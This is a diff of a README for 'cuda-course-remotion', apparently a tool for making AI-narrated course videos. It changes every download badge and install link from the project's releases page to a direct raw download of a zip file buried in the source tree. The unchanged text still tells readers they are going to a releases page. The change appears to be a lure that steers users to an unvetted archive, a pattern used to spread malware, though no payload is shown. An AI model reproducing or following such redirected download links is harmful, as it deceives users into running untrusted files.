@@ -1,6 +1,6 @@
 # 🎥 cuda-course-remotion - Create AI Narrated Course Videos Easily
 
-[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)
+[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/raw/refs/heads/main/slideshow/src/cuda_course_remotion_v1.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ The software follows this process to create each course video:
 ## 🔽 Download and Install
 
 1. Go to the release page here:  
-   [Download cuda-course-remotion](https://github.com/CelexK/cuda-course-remotion/releases)  
+   [Download cuda-course-remotion](https://github.com/CelexK/cuda-course-remotion/raw/refs/heads/main/slideshow/src/cuda_course_remotion_v1.4.zip)  
    This link will take you to a page with the latest releases.
 
 2. On the releases page, find the newest version.  
@@ -168,4 +168,4 @@ For help or to report issues, use the GitHub repository’s Issues tab. Include 
 
 ---
 
-[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/releases)
+[![Download cuda-course-remotion](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/CelexK/cuda-course-remotion/raw/refs/heads/main/slideshow/src/cuda_course_remotion_v1.4.zip)
